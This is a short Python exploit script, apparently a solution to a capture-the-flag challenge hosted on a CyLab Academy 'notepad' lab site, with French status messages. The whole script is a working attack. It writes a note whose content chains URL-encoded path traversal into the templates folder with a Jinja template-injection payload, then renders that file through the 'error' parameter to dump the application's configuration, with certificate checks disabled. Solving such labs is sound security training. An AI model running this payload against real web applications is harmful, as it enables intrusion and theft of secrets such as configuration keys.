import sys, requests, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})

content = "..%2ftemplates%2fpwn" + "{{config|string}}"
r = S.post(BASE + "/new", data={"content": content}, timeout=20, verify=False, allow_redirects=False)
loc = r.headers.get("Location", "")
print("status:", r.status_code, "loc:", loc[:160])
m = re.search(r"(pwn-[A-Za-z0-9_\-]+\.html)", loc)
if not m:
    print("echec creation")
    sys.exit(1)
fname = m.group(1)
print("fichier:", fname)
err = "../" + fname[:-len(".html")]
r2 = S.get(BASE + "/", params={"error": err}, timeout=20, verify=False)
print("=== reponse ===")
print(r2.text[:1200])
